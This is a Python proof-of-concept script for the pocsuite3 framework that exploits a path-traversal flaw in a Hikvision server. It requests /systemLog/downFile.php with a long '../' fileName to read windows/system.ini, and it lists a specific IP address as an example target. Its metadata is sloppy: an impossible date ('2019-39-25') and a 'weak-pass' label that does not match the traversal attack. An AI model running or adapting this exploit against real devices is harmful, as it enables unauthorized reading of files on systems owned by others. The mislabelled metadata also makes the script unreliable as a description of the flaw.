#!/usr/bin/env python
# -*- coding: utf-8 -*-

from urllib.parse import urljoin
import base64
from pocsuite3.api import requests, POCBase,logger,Output,register_poc
import base64


class WeakPassPOC(POCBase):
    vulID = ''
    version = '1.0'
    author = ['Totora']
    vulDate = '2019-39-25'
    createDate = '2019-39-25'
    name = 'hikvision server'
    appName = 'hikvision server'
    appPowerLink = ''
    appVersion = ''
    vulType = 'weak-pass'
    example = 'http://91.224.179.196:8088'
    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    def _verify(self):
        path = '/systemLog/downFile.php?fileName=../../../../../../../../../../../../../../../windows/system.ini'
        url = urljoin(self.url, path)
        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
        }
        result = {}
        try:
            res = requests.get(url)
            res_text = res.text.strip()
            if res.status_code == 200:
                if 'window.location.href' not in res_text and 'window.history.back' not in res_text:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['extra'] = res.text
                    result['extra'] = res.text
        except Exception as e:
            logger.info(str(e))
        return self.parse_output(result)

    def _attack(self):
        return self._verify()
    def _shell(self):
        return self._verify()

register_poc(WeakPassPOC)
        

